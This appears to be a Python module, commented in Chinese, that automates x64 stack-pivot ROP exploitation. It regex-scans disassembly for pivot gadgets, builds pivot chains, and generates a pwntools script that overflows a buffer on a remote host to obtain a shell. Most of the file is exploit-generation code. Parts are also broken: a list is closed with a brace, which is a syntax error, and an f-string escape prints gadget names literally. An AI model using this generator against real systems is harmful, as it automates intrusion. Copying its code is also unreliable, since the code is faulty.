"""
栈迁移与高级ROP组合策略生成模块

本模块自动寻找栈迁移（Stack Pivot）gadget，设计迁移链，将栈指针重定位到可控内存区域，
并在新栈上继续ROP，解决小栈溢出或未知栈地址问题。

作者: Deemo 安全研究团队
版本: 1.0.0
"""

import os
import re
import logging
import json
from dataclasses import dataclass, field
from typing import Dict, List, Optional, Set, Tuple, Any, Callable
from enum import Enum

logger = logging.getLogger(__name__)


class PivotType(Enum):
    """栈迁移类型"""
    XCHG_REG = "xchg_reg"               # xchg reg, rsp; ret
    XCHG_MEM = "xchg_mem"               # xchg [reg], rsp; ret
    POP_POP_RET = "pop_pop_ret"         # pop rsp; ret
    LEAVE = "leave"                      # leave (mov rsp, rbp; pop rbp)
    ADD_JMP = "add_jmp"                 # add rsp, X; jmp Y
    REG_TO_STACK = "reg_to_stack"       # mov rsp, reg; ret


@dataclass
class GadgetInfo:
    """
    ROP Gadget 信息
    """
    address: int
    instruction: str
    disassembly: str
    category: str = ""
    quality: float = 1.0  # 质量评分
    registers_modified: List[str] = field(default_factory=list)
    registers_used: List[str] = field(default_factory=list)
    memory_access: bool = False
    branches: bool = False
    
    def to_dict(self) -> Dict[str, Any]:
        return {
            "address": hex(self.address),
            "instruction": self.instruction,
            "disassembly": self.disassembly,
            "category": self.category,
            "quality": self.quality,
            "registers_modified": self.registers_modified,
            "registers_used": self.registers_used,
        }


@dataclass
class StackPivotGadget(GadgetInfo):
    """
    栈迁移 Gadget
    """
    pivot_type: PivotType = PivotType.XCHG_REG
    source_register: str = ""  # 值来源的寄存器
    stack_direction: str = "down"  # 栈增长方向
    reliability: float = 1.0  # 可靠性
    constraints: List[str] = field(default_factory=list)  # 使用条件
    
    def to_dict(self) -> Dict[str, Any]:
        base = super().to_dict()
        base.update({
            "pivot_type": self.pivot_type.value,
            "source_register": self.source_register,
            "stack_direction": self.stack_direction,
            "reliability": self.reliability,
            "constraints": self.constraints,
        })
        return base


@dataclass
class PivotChain:
    """
    栈迁移链
    """
    chain_id: str
    
    # 迁移 gadget
    pivot_gadget: StackPivotGadget
    
    # 准备步骤（设置源寄存器）
    setup_gadgets: List[GadgetInfo] = field(default_factory=list)
    
    # 迁移后的 ROP 链
    rop_chain: List[GadgetInfo] = field(default_factory=list)
    
    # 目标内存区域
    target_region: str = ""  # heap, bss, stack, etc.
    target_address: int = 0
    target_size: int = 0
    
    # 构造的新栈内容
    new_stack_content: List[bytes] = field(default_factory=list)
    
    # 元数据
    total_length: int = 0
    reliability: float = 0.0
    description: str = ""
    
    def to_dict(self) -> Dict[str, Any]:
        return {
            "chain_id": self.chain_id,
            "pivot_gadget": self.pivot_gadget.to_dict(),
            "setup_gadgets": [g.to_dict() for g in self.setup_gadgets],
            "rop_chain": [g.to_dict() for g in self.rop_chain],
            "target_region": self.target_region,
            "target_address": hex(self.target_address) if self.target_address else None,
            "target_size": self.target_size,
            "total_length": self.total_length,
            "reliability": self.reliability,
            "description": self.description,
        }


@dataclass
class ExploitWithPivot:
    """
    带栈迁移的完整利用方案
    """
    exploit_id: str
    
    # 触发漏洞
    overflow_gadget: GadgetInfo
    overflow_size: int
    
    # 栈迁移
    pivot_chain: PivotChain
    
    # 新的 ROP 链（在 pivot 后执行）
    final_rop: List[GadgetInfo] = field(default_factory=list)
    
    # payload 构造
    payload_template: bytes = b''
    
    # 需要的泄露信息
    required_leaks: List[str] = field(default_factory=list)
    
    # 可选：shellcode
    shellcode: Optional[bytes] = None
    shellcode_address: int = 0
    
    # 利用步骤
    steps: List[str] = field(default_factory=list)
    
    # 代码生成
    python_exploit: str = ""
    asm_gadgets: str = ""
    
    def to_dict(self) -> Dict[str, Any]:
        return {
            "exploit_id": self.exploit_id,
            "overflow_size": self.overflow_size,
            "pivot_chain": self.pivot_chain.to_dict(),
            "final_rop": [g.to_dict() for g in self.final_rop],
            "required_leaks": self.required_leaks,
            "has_shellcode": self.shellcode is not None,
            "shellcode_size": len(self.shellcode) if self.shellcode else 0,
            "steps": self.steps,
        }


class StackPivotGenerator:
    """
    栈迁移与高级 ROP 组合策略生成器
    
    自动寻找栈迁移 gadget，设计迁移链
    """
    
    # x64 寄存器
    X64_REGISTERS = ['rax', 'rbx', 'rcx', 'rdx', 'rsi', 'rdi', 'rbp', 'rsp', 
                     'r8', 'r9', 'r10', 'r11', 'r12', 'r13', 'r14', 'r15']
    
    # 栈迁移 gadget 模式
    PIVOT_PATTERNS = [
        # xchg rsp, reg; ret
        (r'xchg\s+rsp,\s*([a-zA-Z0-9]+)', PivotType.XCHG_REG),
        (r'xchg\s+([a-zA-Z0-9]+),\s*rsp', PivotType.XCHG_REG),
        # xchg rsp, [reg]; ret
        (r'xchg\s+rsp,\s*\[[^\]]+\]', PivotType.XCHG_MEM),
        # pop rsp; ret
        (r'pop\s+rsp\s*;?\s*ret', PivotType.POP_POP_RET),
        # leave (mov rsp, rbp; pop rbp)
        (r'leave', PivotType.LEAVE),
        # add rsp, X; jmp/call Y
        (r'add\s+rsp,\s*([0-9a-fA-Fx]+)', PivotType.ADD_JMP),
        # mov rsp, reg; ret
        (r'mov\s+rsp,\s*([a-zA-Z0-9]+)', PivotType.REG_TO_STACK),
    ]
    
    # 高质量 ROP gadget 模式
    ROP_PATTERNS = [
        r'pop\s+([a-zA-Z0-9]+)\s*;?\s*ret',
        r'pop\s+([a-zA-Z0-9]+)\s*;?\s*pop\s+([a-zA-Z0-9]+)\s*;?\s*ret',
        r'mov\s+([a-zA-Z]+),\s*([a-zA-Z0-9]+)\s*;?\s*ret',
        r'xchg\s+([a-zA-Z]+),\s*([a-zA-Z0-9]+)\s*;?\s*ret',
        r'lea\s+([a-zA-Z]+),\s*\[([^\]]+)\]\s*;?\s*ret',
    ]
    
    def __init__(
        self,
        binary_path: str = "",
        arch: str = "amd64",
        max_gadget_length: int = 5
    ):
        """
        初始化栈迁移生成器
        
        Args:
            binary_path: 二进制文件路径
            arch: 架构
            max_gadget_length: 最大 gadget 指令数
        """
        self.binary_path = binary_path
        self.arch = arch
        self.max_gadget_length = max_gadget_length
        
        self.logger = logging.getLogger(__name__)
        
        # 存储发现的 gadget
        self.pivot_gadgets: List[StackPivotGadget] = []
        self.rop_gadgets: List[GadgetInfo] = []
        
        # 二进制信息
        self.binary_base: int = 0
        self.entry_point: int = 0
        self.sections: Dict[str, Tuple[int, int]] = {}  # name -> (addr, size)
    
    def scan_gadgets(
        self,
        disassembly_data: Optional[Dict[int, str]] = None,
        rop_gadgets: Optional[List[GadgetInfo]] = None
    ) -> List[StackPivotGadget]:
        """
        扫描栈迁移 gadget
        
        Args:
            disassembly_data: 反汇编数据 {地址: 指令}
            rop_gadgets: 预扫描的 ROP gadget
        
        Returns:
            List[StackPivotGadget]: 栈迁移 gadget 列表
        """
        self.logger.info("开始扫描栈迁移 gadgets")
        
        if disassembly_data:
            self._scan_from_disassembly(disassembly_data)
        
        self.logger.info(f"发现 {len(self.pivot_gadgets)} 个栈迁移 gadget")
        
        return self.pivot_gadgets
    
    def _scan_from_disassembly(
        self,
        disassembly_data: Dict[int, str]
    ) -> None:
        """
        从反汇编数据扫描 gadget
        
        Args:
            disassembly_data: 反汇编数据
        """
        for addr, instruction in disassembly_data.items():
            inst_lower = instruction.lower()
            
            # 检查是否是栈迁移 gadget
            for pattern, pivot_type in self.PIVOT_PATTERNS:
                if re.search(pattern, inst_lower, re.IGNORECASE):
                    gadget = self._create_pivot_gadget(
                        addr, instruction, pivot_type, pattern
                    )
                    if gadget:
                        self.pivot_gadgets.append(gadget)
                        break
    
    def _create_pivot_gadget(
        self,
        address: int,
        instruction: str,
        pivot_type: PivotType,
        pattern: str
    ) -> Optional[StackPivotGadget]:
        """
        创建栈迁移 gadget 对象
        
        Args:
            address: 地址
            instruction: 指令
            pivot_type: 迁移类型
            pattern: 匹配模式
        
        Returns:
            Optional[StackPivotGadget]: 栈迁移 gadget
        """
        match = re.search(pattern, instruction.lower())
        source_reg = ""
        
        if match and match.lastindex and match.lastindex >= 1:
            source_reg = match.group(1)
        
        # 创建 gadget
        gadget = StackPivotGadget(
            address=address,
            instruction=instruction,
            disassembly=instruction,
            pivot_type=pivot_type,
            source_register=source_reg,
            category="stack_pivot",
            quality=self._assess_gadget_quality(instruction),
        )
        
        # 评估可靠性
        gadget.reliability = self._assess_pivot_reliability(gadget)
        
        return gadget
    
    def _assess_gadget_quality(self, instruction: str) -> float:
        """
        评估 gadget 质量
        
        Args:
            instruction: 指令
        
        Returns:
            float: 质量分数 (0.0 - 1.0)
        """
        quality = 1.0
        
        # 检查是否包含可能破坏上下文的指令
        bad_keywords = ['sub', 'add', 'and', 'or', 'xor']
        for kw in bad_keywords:
            if kw in instruction.lower():
                quality -= 0.1
        
        # 检查是否是简单的单指令 gadget
        if 'ret' in instruction and instruction.count(';') <= 1:
            quality += 0.1
        
        return max(0.0, min(1.0, quality))
    
    def _assess_pivot_reliability(self, gadget: StackPivotGadget) -> float:
        """
        评估栈迁移 gadget 可靠性
        
        Args:
            gadget: 栈迁移 gadget
        
        Returns:
            float: 可靠性分数
        """
        reliability = 0.8  # 基础可靠性
        
        # xchg rsp, reg 最可靠
        if gadget.pivot_type == PivotType.XCHG_REG:
            reliability = 1.0
        
        # leave 有额外开销
        elif gadget.pivot_type == PivotType.LEAVE:
            reliability = 0.7
            gadget.constraints.append("会修改 rbp")
        
        # pop rsp 很少见
        elif gadget.pivot_type == PivotType.POP_POP_RET:
            reliability = 0.9
        
        # 检查是否有额外的副作用
        if len(gadget.registers_modified) > 2:
            reliability -= 0.2
        
        return max(0.0, min(1.0, reliability))
    
    def generate_pivot_chain(
        self,
        pivot_gadget: StackPivotGadget,
        target_address: int,
        target_size: int = 4096,
        target_region: str = "heap",
        rop_gadgets: Optional[List[GadgetInfo]] = None
    ) -> PivotChain:
        """
        生成栈迁移链
        
        Args:
            pivot_gadget: 栈迁移 gadget
            target_address: 目标地址（泄露得到的地址）
            target_size: 目标区域大小
            target_region: 目标区域类型
            rop_gadgets: 可用的 ROP gadget
        
        Returns:
            PivotChain: 栈迁移链
        """
        chain_id = f"pivot_{pivot_gadget.address:x}_{target_region}"
        
        chain = PivotChain(
            chain_id=chain_id,
            pivot_gadget=pivot_gadget,
            target_region=target_region,
            target_address=target_address,
            target_size=target_size,
            reliability=pivot_gadget.reliability,
        )
        
        # 添加设置源寄存器的 gadget
        if pivot_gadget.source_register:
            setup_gadgets = self._find_setup_gadgets(
                pivot_gadget.source_register, rop_gadgets
            )
            chain.setup_gadgets = setup_gadgets
        
        # 构建在新栈上的 ROP 链（示例）
        if rop_gadgets:
            chain.rop_chain = self._build_new_stack_rop(rop_gadgets)
        
        # 估算总长度
        chain.total_length = (
            len(chain.setup_gadgets) * 8 +  # setup gadgets
            8 +  # pivot gadget
            len(chain.rop_chain) * 8  # new stack ROP
        )
        
        chain.description = (
            f"将栈迁移到 {target_region} @ {hex(target_address)}，"
            f"使用 {pivot_gadget.instruction}"
        )
        
        return chain
    
    def _find_setup_gadgets(
        self,
        target_register: str,
        rop_gadgets: Optional[List[GadgetInfo]]
    ) -> List[GadgetInfo]:
        """
        寻找设置寄存器的 gadget
        
        Args:
            target_register: 目标寄存器
            rop_gadgets: 可用的 ROP gadget
        
        Returns:
            List[GadgetInfo]: 设置 gadget 列表
        """
        setup_gadgets = []
        
        if rop_gadgets is None:
            rop_gadgets = self.rop_gadgets
        
        # 寻找 pop reg; ret 类型的 gadget
        for gadget in rop_gadgets:
            if f"pop {target_register}" in gadget.instruction.lower():
                setup_gadgets.append(gadget)
                if len(setup_gadgets) >= 1:
                    break
        
        return setup_gadgets
    
    def _build_new_stack_rop(
        self,
        rop_gadgets: List[GadgetInfo]
    ) -> List[GadgetInfo]:
        """
        在新栈上构建 ROP 链
        
        Args:
            rop_gadgets: 可用的 ROP gadget
        
        Returns:
            List[GadgetInfo]: ROP 链
        """
        # 示例：简单构建一个 ret sled
        chain = []
        
        for i, gadget in enumerate(rop_gadgets[:5]):
            if gadget.instruction.lower() == 'ret':
                chain.append(gadget)
        
        return chain
    
    def generate_exploit(
        self,
        overflow_size: int,
        pivot_chain: PivotChain,
        goal: str = "shell",
        leaked_address: Optional[int] = None
    ) -> ExploitWithPivot:
        """
        生成完整的利用方案
        
        Args:
            overflow_size: 溢出大小
            pivot_chain: 栈迁移链
            goal: 利用目标 ('shell', 'read_flag', 'exec')
            leaked_address: 泄露的地址
        
        Returns:
            ExploitWithPivot: 利用方案
        """
        exploit_id = f"exploit_{overflow_size}_pivot"
        
        exploit = ExploitWithPivot(
            exploit_id=exploit_id,
            overflow_size=overflow_size,
            pivot_chain=pivot_chain,
        )
        
        # 确定目标地址
        target_addr = leaked_address or pivot_chain.target_address
        
        # 生成利用步骤
        steps = [
            f"1. 溢出 {overflow_size} 字节，覆盖返回地址",
            f"2. 控制 {pivot_chain.pivot_gadget.source_register} 为 {hex(target_addr)}",
            f"3. 执行 pivot gadget: {pivot_chain.pivot_gadget.instruction}",
            f"4. 栈已迁移到 {pivot_chain.target_region}",
            "5. 在新栈上执行 ROP 链",
        }
        
        if goal == "shell":
            steps.append("6. 调用 system('/bin/sh') 获取 shell")
        elif goal == "read_flag":
            steps.append("6. 读取 flag 文件内容")
        
        exploit.steps = steps
        
        # 生成 Python 利用脚本
        exploit.python_exploit = self._generate_python_exploit(exploit)
        
        return exploit
    
    def _generate_python_exploit(self, exploit: ExploitWithPivot) -> str:
        """
        生成 Python 利用脚本
        
        Args:
            exploit: 利用方案
        
        Returns:
            str: Python 脚本
        """
        script = f'''#!/usr/bin/env python3
"""
{exploit.exploit_id}
{exploit.pivot_chain.description}
"""

from pwn import *

context.arch = '{self.arch}'
context.update(arch='{self.arch}')

# 目标信息
HOST = "target.example.com"
PORT = 12345

def create_payload():
    # 溢出数据
    overflow_size = {exploit.overflow_size}
    payload = b"A" * overflow_size
    
    # 设置目标寄存器 (需要先泄露 {exploit.pivot_chain.pivot_gadget.source_register})
    # 这里需要先泄露该寄存器的值
    
    # 添加 setup gadget 来设置寄存器
'''
        
        for i, gadget in enumerate(exploit.pivot_chain.setup_gadgets):
            script += f'    # Setup gadget {i+1}: {gadget.instruction}\n'
            script += f'    payload += p64({gadget.address + self.binary_base})\n'
        
        # 添加 pivot gadget
        script += f'''
    # Pivot gadget: {exploit.pivot_chain.pivot_gadget.instruction}
    payload += p64({exploit.pivot_chain.pivot_gadget.address + self.binary_base})
    
    # 在新栈上的 ROP 链
'''
        
        for gadget in exploit.pivot_chain.rop_chain:
            script += f'    # {{gadget.instruction}}\n'
            script += f'    payload += p64({gadget.address + self.binary_base})\n'
        
        script += '''
    return payload

def exploit():
    p = remote(HOST, PORT)
    # 或者本地: p = process("./target")
    
    log.info("发送 payload...")
    p.sendline(create_payload())
    
    p.interactive()

if __name__ == "__main__":
    exploit()
'''
        
        return script
    
    def add_pivot_gadget(self, gadget: StackPivotGadget) -> None:
        """
        手动添加栈迁移 gadget
        
        Args:
            gadget: 栈迁移 gadget
        """
        self.pivot_gadgets.append(gadget)
    
    def add_rop_gadget(self, gadget: GadgetInfo) -> None:
        """
        手动添加 ROP gadget
        
        Args:
            gadget: ROP gadget
        """
        self.rop_gadgets.append(gadget)
    
    def export_chains(
        self,
        chains: List[PivotChain],
        output_path: str
    ) -> None:
        """
        导出栈迁移链
        
        Args:
            chains: 栈迁移链列表
            output_path: 输出路径
        """
        data = {
            "binary": self.binary_path,
            "arch": self.arch,
            "pivot_gadget_count": len(self.pivot_gadgets),
            "rop_gadget_count": len(self.rop_gadgets),
            "chains": [c.to_dict() for c in chains]
        }
        
        with open(output_path, 'w', encoding='utf-8') as f:
            json.dump(data, f, indent=2, ensure_ascii=False)
        
        self.logger.info(f"栈迁移链已导出: {output_path}")


def generate_stack_pivot_exploit(
    pivot_gadgets: List[Dict[str, Any]],
    overflow_size: int,
    leaked_address: int,
    target_region: str = "heap"
) -> ExploitWithPivot:
    """
    便捷函数：生成栈迁移利用
    
    Args:
        pivot_gadgets: 栈迁移 gadget 列表
        overflow_size: 溢出大小
        leaked_address: 泄露的地址
        target_region: 目标区域类型
    
    Returns:
        ExploitWithPivot: 利用方案
    """
    generator = StackPivotGenerator()
    
    # 添加 pivot gadgets
    for pg in pivot_gadgets:
        gadget = StackPivotGadget(
            address=pg['address'],
            instruction=pg['instruction'],
            disassembly=pg['instruction'],
            pivot_type=PivotType(pg.get('type', 'xchg_reg')),
            source_register=pg.get('source_register', ''),
        )
        generator.add_pivot_gadget(gadget)
    
    if generator.pivot_gadgets:
        # 生成链
        chain = generator.generate_pivot_chain(
            generator.pivot_gadgets[0],
            leaked_address,
            target_region=target_region
        )
        
        # 生成利用
        exploit = generator.generate_exploit(
            overflow_size=overflow_size,
            pivot_chain=chain,
            leaked_address=leaked_address
        )
        
        return exploit
    
    return None


# 示例用法和测试
if __name__ == '__main__':
    logging.basicConfig(level=logging.DEBUG)
    
    # 创建生成器
    generator = StackPivotGenerator(arch="amd64")
    
    # 模拟发现一些 pivot gadgets
    test_pivots = [
        {
            'address': 0x401020,
            'instruction': 'xchg rsp, rax; ret',
            'type': 'xchg_reg',
            'source_register': 'rax'
        },
        {
            'address': 0x401030,
            'instruction': 'xchg rsp, rbp; ret',
            'type': 'xchg_reg',
            'source_register': 'rbp'
        },
        {
            'address': 0x401040,
            'instruction': 'leave; ret',
            'type': 'leave',
            'source_register': 'rbp'
        },
    ]
    
    for pivot in test_pivots:
        gadget = StackPivotGadget(
            address=pivot['address'],
            instruction=pivot['instruction'],
            disassembly=pivot['instruction'],
            pivot_type=PivotType(pivot['type']),
            source_register=pivot.get('source_register', ''),
        )
        generator.add_pivot_gadget(gadget)
    
    print(f"\n发现 {len(generator.pivot_gadgets)} 个栈迁移 gadgets")
    
    for gadget in generator.pivot_gadgets:
        print(f"  [{gadget.pivot_type.value}] {gadget.instruction}")
        print(f"    地址: {hex(gadget.address)}")
        print(f"    源寄存器: {gadget.source_register}")
        print(f"    可靠性: {gadget.reliability:.2f}")
    
    # 生成栈迁移链
    if generator.pivot_gadgets:
        best_gadget = max(generator.pivot_gadgets, key=lambda g: g.reliability)
        
        leaked_heap = 0x0000000000600000  # 假设泄露的堆地址
        chain = generator.generate_pivot_chain(
            best_gadget,
            target_address=leaked_heap,
            target_region="heap"
        )
        
        print("\n" + "=" * 60)
        print("栈迁移链")
        print("=" * 60)
        print(f"Chain ID: {chain.chain_id}")
        print(f"Pivot: {chain.pivot_gadget.instruction}")
        print(f"目标区域: {chain.target_region} @ {hex(chain.target_address)}")
        print(f"总长度: {chain.total_length} bytes")
        print(f"描述: {chain.description}")
        
        # 生成利用方案
        exploit = generator.generate_exploit(
            overflow_size=72,  # 典型溢出大小
            pivot_chain=chain,
            goal="shell",
            leaked_address=leaked_heap
        )
        
        print("\n" + "=" * 60)
        print("利用方案")
        print("=" * 60)
        print(f"Exploit ID: {exploit.exploit_id}")
        print(f"溢出大小: {exploit.overflow_size}")
        
        print("\n步骤:")
        for step in exploit.steps:
            print(f"  {step}")
        
        print("\nPython 脚本:")
        print("-" * 40)
        print(exploit.python_exploit[:1000] + "..." if len(exploit.python_exploit) > 1000 else exploit.python_exploit)
